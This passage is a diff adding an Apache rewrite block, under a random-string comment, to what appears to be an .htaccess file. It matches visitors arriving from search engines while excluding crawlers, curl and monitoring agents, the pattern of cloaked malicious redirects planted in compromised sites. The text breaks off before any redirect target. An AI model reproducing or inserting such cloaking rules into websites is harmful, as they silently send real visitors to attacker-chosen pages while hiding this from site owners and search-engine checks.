@@ -1,0 +1,16 @@
+
+
+# exgocgkctswo
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD}   ^GET$
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(google\.|yahoo\.|bing\.|msn\.|yandex\.|ask\.|excite\.|altavista\.|netscape\.|aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.|lycos\.|search\.|metacrawler\.|rambler\.|mail\.|dogpile\.|ya\.|\/search\?).*$   [NC]
+RewriteCond %{HTTP_REFERER}     !^.*(q\=cache\:).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|ecto|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|iPhone|IRIX|Jakarta|JetBrains).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChec
